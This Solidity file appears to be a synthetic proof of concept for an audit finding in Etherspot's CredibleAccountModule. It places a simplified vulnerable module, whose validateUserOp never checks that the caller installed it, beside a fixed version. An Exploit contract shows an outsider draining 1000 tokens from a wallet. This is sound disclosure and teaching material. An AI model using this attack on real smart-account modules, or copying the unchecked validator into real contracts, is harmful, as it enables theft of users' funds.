// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Etherspot CredibleAccountModule — validateUserOp does not check that the
    caller installed the module (Shieldify, finding #61412 / H-02, July 2025).

    SYNTHETIC, cheatcode-free. The wallet installed the module as a validator.
    An outsider calls validateUserOp anyway. There is no
    validatorInitialized[msg.sender] check, so the userOp moves N = 1000 GLUE.
    The fixed module reverts ModuleNotInstalled for that caller. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Wallet {
    function approve(Token token, address module, uint256 amount) external {
        token.approve(module, amount);
    }

    function install(address module) external {
        CredibleAccountModule(module).onInstall();
    }
}

contract CredibleAccountModule {
    Token public token;
    mapping(address => bool) public validatorInitialized;
    mapping(address => address) public sessionWallet;
    mapping(address => bool) public live;

    constructor(Token token_) {
        token = token_;
    }

    function onInstall() external {
        validatorInitialized[msg.sender] = true;
    }

    function bind(address sessionKey, address wallet) external {
        sessionWallet[sessionKey] = wallet;
    }

    function validateUserOp(address wallet, uint256 amount, bytes calldata signature) external returns (uint256) {
        if (signature.length < 65) return 1;
        address sessionKey = address(bytes20(signature));
        if (sessionWallet[sessionKey] != wallet) return 1;
        // @> VULN: the caller is not required to be a wallet that installed this validator
        token.transferFrom(wallet, msg.sender, amount);
        live[sessionKey] = false;
        return 0;
    }
}

contract CredibleAccountModuleFixed {
    Token public token;
    mapping(address => bool) public validatorInitialized;
    mapping(address => address) public sessionWallet;

    error CredibleAccountModule_ModuleNotInstalled(address sender);

    constructor(Token token_) {
        token = token_;
    }

    function onInstall() external {
        validatorInitialized[msg.sender] = true;
    }

    function bind(address sessionKey, address wallet) external {
        sessionWallet[sessionKey] = wallet;
    }

    function validateUserOp(address wallet, uint256 amount, bytes calldata signature) external returns (uint256) {
        if (!validatorInitialized[msg.sender]) revert CredibleAccountModule_ModuleNotInstalled(msg.sender);
        if (signature.length < 65) return 1;
        address sessionKey = address(bytes20(signature));
        if (sessionWallet[sessionKey] != wallet) return 1;
        token.transferFrom(wallet, msg.sender, amount);
        return 0;
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    Token public token;
    Wallet public wallet;
    CredibleAccountModule public module;
    address public sessionKey;

    constructor() {
        token = new Token("Glue", "GLUE", 18);
        wallet = new Wallet();
        module = new CredibleAccountModule(token);
        sessionKey = address(0xBEEF);
    }

    function run() external {
        token.mint(address(wallet), N);
        wallet.approve(token, address(module), N);
        wallet.install(address(module));
        module.bind(sessionKey, address(wallet));
        bytes memory signature = abi.encodePacked(bytes20(uint160(sessionKey)), new bytes(45));
        uint256 code = module.validateUserOp(address(wallet), N, signature);
        require(code == 0, "userOp rejected");
        require(module.validatorInitialized(address(wallet)), "wallet did install");
        require(!module.validatorInitialized(address(this)), "caller did not install");
        require(token.balanceOf(address(this)) == N, "userOp did not move N");
        require(token.balanceOf(address(wallet)) == 0, "wallet still holds N");
    }
}
